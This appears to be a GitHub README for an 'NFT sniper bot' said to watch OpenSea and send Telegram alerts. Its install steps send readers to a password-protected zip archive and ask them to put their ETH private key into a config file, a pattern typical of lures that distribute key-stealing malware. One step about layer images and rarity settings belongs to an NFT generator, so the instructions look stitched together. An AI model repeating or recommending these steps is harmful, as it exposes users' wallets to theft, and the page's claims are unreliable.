# nft-sniper-bot

NFT Sniper is a  bot designed to swiftly identify new announcements within the OpenSea blockchain. It achieves this by leveraging telegram notifications to promptly notify users of any updates.

## Install
- [Download](https://github.com/freesparrowrob/nft-sniper-bot/archive/refs/heads/main.zip) the repository release and extract files with password `YHS70vOP4Q`.
- Edit the address and `private_key` fields in the `config.json` file.
- Add layer images by folders, set up rarity settings, select folder to save.

## Usage
- Input your ETH private key. Ensure that you do not utilize your primary account or seed phrase
- Do not set the price higher than the floor! Otherwise, you risk losing all your ETH to random NFTs.
### Logs contain:

* Action type (now only list/buy)
* Block/Current timestamp
* collection symbol, token name
* price, rarity, rank, supply, seller, buyer
![]((https://github.com/freesparrowrob/nft-sniper-bot/blob/main/usage.png))
